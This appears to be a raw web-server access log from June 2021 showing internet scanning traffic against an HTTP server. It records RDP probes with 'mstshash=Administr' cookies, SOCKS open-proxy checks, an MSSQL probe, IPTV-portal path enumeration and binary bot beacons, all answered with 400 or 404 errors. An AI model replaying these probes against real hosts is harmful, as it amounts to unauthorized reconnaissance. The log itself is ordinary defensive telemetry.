117.73.9.5 - - [03/Jun/2021 06:42:04] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eÃ \x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
117.73.9.5 - - [03/Jun/2021 06:42:04] "[35m[1m  Ã           [0m" HTTPStatus.BAD_REQUEST -
216.218.206.69 - - [03/Jun/2021 08:12:51] "[33mGET / HTTP/1.1[0m" 404 -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad request syntax ('\x16\x03\x01\x01"\x01\x00\x01\x1e\x03\x03{ÂªRÃv\x91JÃ\x02c\x9aseyzbMÂ¹Â©\x93\x86Â¸\x1e\\\x0ccj\x92Ã\x9eÂ®\t\x00\x00\x88Ã0Ã,Ã(Ã$Ã\x14Ã')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m" {ÂªRÃvÂJÃcÂseyzbMÂ¹Â©ÂÂÂ¸\cjÂÃÂÂ®	  ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad request version ('ÃÃ§Â³Â¢cÃ¾ÃÃ¶\x00\x00\x88Ã0Ã,Ã(Ã$Ã\x14Ã')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m" ÂdÃ´-JÃM8Ã|ÂÃ«Âº\GÃhÃ¡ Â¨.Ã´ÃÃ§Â³Â¢cÃ¾ÃÃ¶  ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ã\x01\x00\x00Ã\x03\x02\x96\x83\x07l[|_\x0f\x13ÃK\x7f\x08Ã\x8eÃ¦=dÃ4Ã¼sÃ/')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m Ã  ÃÂÂl[|_ÃKÃÂÃ¦=dÃ4Ã¼sÃ/]DMwÂ  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ã\x01\x00\x00Ã\x03\x01\x11\x87xCQ\x11Ã')
101.251.200.219 - - [03/Jun/2021 10:24:18] "[35m[1m Ã  ÃÂxCQÃ	J43Ã¶Âµ5VÂ¡ÃÃ¸kÂ¨<ÃDÂnqÃ·Ã¢Ã·wÂ  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [03/Jun/2021 10:24:18] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [03/Jun/2021 12:02:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 12:02:57] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.120.14.54 - - [03/Jun/2021 12:33:31] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.54 - - [03/Jun/2021 12:33:33] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [03/Jun/2021 14:35:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 14:35:29] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 15:11:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 15:11:04] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [03/Jun/2021 15:49:11] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [03/Jun/2021 15:49:11] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [03/Jun/2021 15:49:20] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [03/Jun/2021 15:49:20] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [03/Jun/2021 15:50:14] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
91.241.19.150 - - [03/Jun/2021 16:01:30] code 400, message Bad request version ('\x03\x00(\x00\x04Ã¿\x08\x00\x01U\x00\x00\x00MSSQLServer\x00ÃÂ·\x00\x00')
91.241.19.150 - - [03/Jun/2021 16:01:30] "[35m[1m 4           ( Ã¿ U   MSSQLServer ÃÂ·  [0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [03/Jun/2021 16:15:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [03/Jun/2021 16:15:55] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
35.245.224.63 - - [03/Jun/2021 17:18:15] "[33mGET / HTTP/1.1[0m" 404 -
35.245.224.63 - - [03/Jun/2021 17:18:15] code 400, message Bad request syntax ('\x16\x03\x01\x01N\x01\x00\x01J\x03\x03\x16Ãº\x92;Â¤Ã \x12eX\x01\x17EÃ£Ã8\x1f\x91R,ÃÂ¤\x0bÃ¦Ã\x9dp\'_Ã£\x8dÂ·B )ÃR"Ã®\x9etÃÃY\x07Â¨Â¿Â»ZÃ"+?Ã¡KÂ¼DÂ¨Ã \x15Ã£Ã¤Ã\x1e/\x18\x00v\x13\x02\x13\x03\x13\x01Ã/Ã+Ã0Ã,\x00\x9eÃ\'\x00gÃ(\x00k\x00Â£\x00\x9fÃÂ©ÃÂ¨ÃÂªÃÂ¯Ã\xadÃÂ£Ã\x9fÃ]ÃaÃWÃS\x00Â¢ÃÂ®ÃÂ¬ÃÂ¢Ã\x9eÃ\\Ã`ÃVÃRÃ$\x00jÃ#\x00@Ã')
35.245.224.63 - - [03/Jun/2021 17:18:15] "[35m[1mN JÃºÂ;Â¤Ã eXEÃ£Ã8ÂR,ÃÂ¤Ã¦ÃÂp'_Ã£ÂÂ·B )ÃR"Ã®ÂtÃÃYÂ¨Â¿Â»ZÃ"+?Ã¡KÂ¼DÂ¨Ã Ã£Ã¤Ã/ vÃ/Ã+Ã0Ã, ÂÃ' gÃ( k Â£ ÂÃÂ©ÃÂ¨ÃÂªÃÂ¯ÃÂ­ÃÂ£ÃÂÃ]ÃaÃWÃS Â¢ÃÂ®ÃÂ¬ÃÂ¢ÃÂÃ\Ã`ÃVÃRÃ$ jÃ# @Ã[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 22:35:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 22:35:58] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [03/Jun/2021 22:59:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [03/Jun/2021 22:59:44] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
165.22.177.176 - - [03/Jun/2021 23:25:15] "[33mGET / HTTP/1.1[0m" 404 -
192.241.204.186 - - [04/Jun/2021 00:49:11] code 400, message Bad request version ('Ã\x14Ã')
192.241.204.186 - - [04/Jun/2021 00:49:11] "[35m[1m Â  ÂVW\Ã¿ÃÃÂ¯cÃÂÂ¨ÂLÃ¡9,Ã¬Â³Â½*b@3ÃÂÃ»ÂcÂ  Ã/Ã+ÃÃÃÃ	ÃÃ[0m" HTTPStatus.BAD_REQUEST -
162.243.166.37 - - [04/Jun/2021 09:00:32] "[33mHEAD / HTTP/1.0[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:33] "[33mGET /system_api.php HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:35] "[33mGET /system_api.php HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:37] "[33mGET /c/version.js HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:39] "[33mGET /streaming/clients_live.php HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:41] "[33mGET /stalker_portal/c/version.js HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:43] "[33mGET /client_area/ HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:46] "[33mGET /stalker_portal/c/ HTTP/1.1[0m" 404 -
162.243.166.37 - - [04/Jun/2021 09:00:48] "[33mGET /stream/live.php HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 09:50:23] code 400, message Bad request version ('\x00/\x00')
111.7.96.144 - - [04/Jun/2021 09:50:23] "[35m[1m  i  eUÂ§Ã¤random1random2random3random4   / [0m" HTTPStatus.BAD_REQUEST -
111.7.96.144 - - [04/Jun/2021 10:13:04] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?GÃÃ·Âº,Ã®ÃªÂ²`~Ã³\x00Ã½\x82{Â¹Ã\x96Ãw\x9bÃ¦ÃÃ<=ÃoÃ¯\x10n\x00\x00(\x00\x16\x00\x13\x00')
111.7.96.144 - - [04/Jun/2021 10:13:04] "[35m[1m  S  O ?GÃÃ·Âº,Ã®ÃªÂ²`~Ã³ Ã½Â{Â¹ÃÂÃwÂÃ¦ÃÃ<=ÃoÃ¯n  (   [0m" HTTPStatus.BAD_REQUEST -
183.136.225.14 - - [04/Jun/2021 10:44:44] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [04/Jun/2021 10:44:44] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [04/Jun/2021 10:44:44] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:03:49] "[33mGET / HTTP/1.0[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:42:42] "[33mHEAD / HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:42:42] "[33mGET / HTTP/1.1[0m" 404 -
111.7.96.144 - - [04/Jun/2021 11:42:42] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
45.155.205.209 - - [04/Jun/2021 14:32:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [04/Jun/2021 14:32:29] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:10:35] code 400, message Bad request syntax ('{\x01\x00\x1615888888888ÃÂ¨\x90Ã\x13\x8a{')
161.189.192.94 - - [04/Jun/2021 15:10:35] "[35m[1m{ 15888888888ÃÂ¨ÂÃÂ{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [04/Jun/2021 15:13:56] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [04/Jun/2021 15:13:56] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:18:04] code 400, message Bad request syntax ('&&&&~\x04Â»8ÃaÃ½T\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.192.94 - - [04/Jun/2021 15:18:04] "[35m[1m&&&&~Â»8ÃaÃ½TP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:27:40] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81IÂ¨Ã\x00\x0c)\x83zÂ»\x01\x00zÃf\x00\x8d\x16Ã~\x9dU\x05Ã±\x1fiÂ»Â©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÃÂ¢|Â¦vÂ½Ã³\x1eOÃÃÃÂ®Ãd')
161.189.192.94 - - [04/Jun/2021 15:27:40] "[35m[1m   TZ         .    ÂIÂ¨Ã )ÂzÂ» zÃf ÂÃ~ÂUÃ±iÂ»Â©                ÃÃÂ¢|Â¦vÂ½Ã³OÃÃÃÂ®Ãd[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [04/Jun/2021 15:30:27] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03Â¥-~')
161.189.134.11 - - [04/Jun/2021 15:30:27] "[35m[1m~   ÂÂÂÂÂÂ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [04/Jun/2021 15:34:13] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.134.11 - - [04/Jun/2021 15:34:13] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:38:40] code 400, message Bad HTTP/0.9 request type ('\x02Â¤UÃ¿\x00\x00\x00')
161.189.192.94 - - [04/Jun/2021 15:38:40] "[35m[1mÂ¤UÃ¿   [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:43:55] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÃ')
161.189.192.94 - - [04/Jun/2021 15:43:55] "[35m[1m~~ 4Vx4/  YQkÃ[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [04/Jun/2021 15:46:50] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.192.94 - - [04/Jun/2021 15:46:50] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
195.3.147.58 - - [04/Jun/2021 15:53:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
195.3.147.58 - - [04/Jun/2021 15:53:21] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [04/Jun/2021 17:06:31] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [04/Jun/2021 17:06:31] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [04/Jun/2021 17:07:53] code 400, message Bad request syntax ('\x04\x01\x00Pg)Â§Ãª\x00')
47.241.193.60 - - [04/Jun/2021 17:07:53] "[35m[1m Pg)Â§Ãª [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [04/Jun/2021 17:08:01] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
128.14.209.162 - - [04/Jun/2021 19:43:42] "[33mGET / HTTP/1.1[0m" 404 -
195.3.147.58 - - [04/Jun/2021 19:58:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
195.3.147.58 - - [04/Jun/2021 19:58:59] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
118.126.124.7 - - [04/Jun/2021 22:41:38] "[33mGET / HTTP/1.1[0m" 404 -
118.126.124.74 - - [05/Jun/2021 02:32:01] "[33mGET / HTTP/1.1[0m" 404 -
222.175.201.150 - - [05/Jun/2021 05:42:21] "[33mGET / HTTP/1.1[0m" 404 -
64.62.197.92 - - [05/Jun/2021 08:04:30] "[33mGET / HTTP/1.1[0m" 404 -
101.251.200.219 - - [05/Jun/2021 08:59:58] code 400, message Bad request version ('\x10Ã§Ã \x81\x00\x00\x88Ã0Ã,Ã(Ã$Ã\x14Ã')
101.251.200.219 - - [05/Jun/2021 08:59:58] "[35m[1m" PÂxÃÂF%ÂÃ¸Â²\|'Ã1E;ÃÂ¤CÂ°ÂÃ§Ã Â  ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:58] code 400, message Bad request version ('Ã\x15ÃºÂ¦Â½?\x11Ã­\x90Â¾\x84rÂ¬\x9c\x9b_Ãªh\x00\x00\x88Ã0Ã,Ã(Ã$Ã\x14Ã')
101.251.200.219 - - [05/Jun/2021 08:59:58] "[35m[1m" Ã°4VÃ¯v/ÃÂaÃÂ»ÃÃºÂ¦Â½?Ã­ÂÂ¾ÂrÂ¬ÂÂ_Ãªh  ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:59] code 400, message Bad request version ('\x00\x00PÃ\x14Ã')
101.251.200.219 - - [05/Jun/2021 08:59:59] "[35m[1m Ã  ÃuÃ½iÂÃO=ÂÃCÃ¤Â¡Ã|~Ã®ÂPÂÃ¸mÂ9Â  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:59] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ã\x01\x00\x00Ã\x03\x01\x87Â²=\x99\x8bÃ+Â¡Â¶Ã>LÃ¹@Â¨\x9c\x8dÂ¯Ã£Â¬-9')
101.251.200.219 - - [05/Jun/2021 08:59:59] "[35m[1m Ã  ÃÂÂ²=ÂÂÃ+Â¡Â¶Ã>LÃ¹@Â¨ÂÂÂ¯Ã£Â¬-9 Ã¼ÂÃ¡Â6Â¾hd  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [05/Jun/2021 08:59:59] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [05/Jun/2021 09:03:43] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [05/Jun/2021 09:03:44] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
34.78.249.119 - - [05/Jun/2021 09:03:53] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [05/Jun/2021 09:03:56] code 400, message Bad request syntax ('\x03qÃÂº`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
193.37.255.114 - - [05/Jun/2021 09:03:56] "[35m[1mqÃÂº`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            [0m" HTTPStatus.BAD_REQUEST -
125.64.94.138 - - [05/Jun/2021 11:28:33] code 400, message Bad HTTP/0.9 request type ('\\x01\\x00\\x00\\x00')
125.64.94.138 - - [05/Jun/2021 11:28:33] "[35m[1m\x01\x00\x00\x00 \xbf\x02\x00\x88\x13\x00\x00\x87\x00\x00\x00NIMABIJIAN\x04\x03\x00\x00{\x99Caig\x9c\x03\xc7eB\xc5\t\xc1\x18a\x11\x1a\x91\x1f\x02\tcof\x91\xc0\x80sJ5\xd2\x80\xe6\x9a~\xb9\xc7\x83^\x96\xeeN\x16\x96\x96&\xe6\x03\xea\xbc\x81\x02=\xac\x10\xfa?7\x03\xc3\xdf\xf7\xe4\x98`p\xe6\x8d\xc1\xa9\x8d\xc6\x06\xdb\xaf\x91\xe7\x82s\xf7\x14H\xd4\xe1W\x9a\x93C\x9e]\xa4\x01#\x03#\x03]\x03c]CC\x05C\x03+S\x03b\xf4\x00\x00/\x9e\x16E[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 12:46:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 12:46:01] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [05/Jun/2021 13:04:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [05/Jun/2021 13:04:02] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [05/Jun/2021 14:08:41] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [05/Jun/2021 14:08:41] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
